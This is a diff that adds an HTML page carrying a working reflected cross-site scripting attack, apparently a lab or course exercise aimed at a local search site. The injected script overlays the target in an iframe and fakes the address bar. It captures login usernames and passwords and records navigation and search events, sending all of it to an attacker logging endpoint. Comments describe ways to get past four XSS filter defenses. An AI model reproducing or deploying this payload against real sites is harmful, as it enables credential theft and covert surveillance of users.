@@ -1,0 +1,103 @@
+
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
+
+function payload(attacker) {
+    var firstload = 0;
+    function log(attacker, data) {
+        console.log($.param(data));
+        $.get(attacker, data);
+    }
+    function getPath(url) {
+        return url.match(/(\/.*)/)[1];
+    }
+    function changeAddressBar(url) {
+        try {
+            window.history.replaceState({}, "", url);
+        } catch(e) {}
+    }
+
+    function proxy(attacker, mainhref) {
+        $('body').children().hide();
+        var i = $('<iframe id=_track>')
+        .css({
+        position: 'absolute',
+        width: '100%',
+        height: '100%',
+        top: 0,
+        left: 0,
+        border: 0,
+        background: '#fff'
+    })
+    .attr('sandbox', 'allow-same-origin allow-forms allow-scripts')
+    .attr('src',"http://permalink.co:8080/")
+    .appendTo('body')
+    .load(function() {
+    if(firstload == 0) {
+        changeAddressBar("http://permalink.co:8080/");
+	    log(attacker, {event: "nav", user: $("#_track").contents().find("#logged-in-user").text(),uri: mainhref});
+        firstload = firstload+1;
+    }
+	$("#_track").contents().find(".list-group").hide();
+    $('body',this.contentDocument)
+        .find('a')
+            .click(function() {
+                log(attacker, {event:'nav', user: $("#_track").contents().find("#logged-in-user").text(),uri: this.href});
+                changeAddressBar(this.href);
+            })
+    .end()
+
+    .find('form')
+    .submit(function() {
+        if($(this).attr('action') == "./login") {
+        var str = $(this).serialize();
+        var struser = "";
+        var eqindex = str.indexOf("=");
+        var andindex = str.indexOf("&");
+        struser = str.substring(eqindex + 1, andindex);
+
+        var strpass = "";
+        var eqindex2 = str.lastIndexOf("=");
+        strpass = str.substring(eqindex2 + 1, str.length);
+
+        log(attacker, {event: 'login', user: struser, pass: strpass});
+        }
+        else if($(this).attr('action') == "./logout"){
+            log(attacker, {event: 'logout', user: $("#_track").contents().find("#logged-in-user").text()})
+        }
+        else {
+            var struri = "http://permalink.co:8080/search?" + "q=" + $("#_track").contents().find("#query").val();
+            changeAddressBar(struri);
+            log(attacker, {event:'nav', user: $("#_track").contents().find("#logged-in-user").text(),uri: struri })
+        }
+    })
+    .end();
+	});
+}
+
+    proxy(attacker, "http://permalink.co:8080/");
+}
+
+function makeLink(xssdefense, target, attacker) {
+	return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+	encodeURIComponent("<script" + ">" + payload.toString() +
+	";payload(\"" + attacker + "\");</script" + ">");
+
+	// for defense 1, replace every occurence of script with scriscriptpt
+	// for defense 2 use body onload
+	// for defense 3 use iframe onload
+	// for defense 4 use grave accent for single quote and double quote, use {} instead of semicolon to help javascript parse your syntax
+
+
+}
+var xssdefense = 0;
+var target = "http://permalink.co:8080/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+var url = makeLink(xssdefense, target, attacker);
+$("#query-lbl").text('');
+window.location.href = url;
+});
+</script>
